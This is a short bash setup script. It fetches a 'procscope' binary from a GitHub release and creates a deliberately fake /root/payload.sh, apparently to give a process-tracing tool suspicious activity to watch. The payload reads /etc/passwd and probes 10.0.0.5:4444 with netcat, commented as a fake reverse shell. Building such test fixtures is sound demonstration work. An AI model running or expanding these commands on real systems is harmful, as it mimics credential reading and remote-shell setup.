#!/bin/bash
# Download the actual procscope binary directly from the user's latest github release!
curl -sL https://github.com/Mutasem-mk4/procscope/releases/download/v1.1.0/procscope_1.1.0_linux_amd64.tar.gz | tar -xz -C /usr/local/bin procscope

# Create the fake payload.sh
cat << 'EOF' > /root/payload.sh
#!/bin/bash
sleep 1
cat /etc/passwd > /dev/null
# Fake a netcat reverse shell
nc -zv 10.0.0.5 4444 2>/dev/null
echo "Initialization complete."
EOF

chmod +x /root/payload.sh
echo "done" > /root/setup_complete
